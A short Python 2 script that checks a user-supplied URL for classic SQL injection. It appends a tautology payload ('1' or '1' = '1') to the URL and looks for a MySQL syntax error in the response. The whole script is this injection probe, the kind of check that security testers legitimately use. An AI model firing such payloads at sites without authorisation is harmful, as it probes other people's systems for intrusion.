from urllib2 import urlopen
import sys
import urllib


momo = raw_input("Please specify the full vulnerable url:  ")

resp = urlopen(momo + "=1\' or \'1\' = \'1\'")
body = resp.read()
fullbody = body.decode('utf-8')

if "You have an error in your SQL syntax" in fullbody:
    print ("The website is classic SQL injection vulnerable!")
else:
	print ("The website is not classic SQL injection vulnerable!")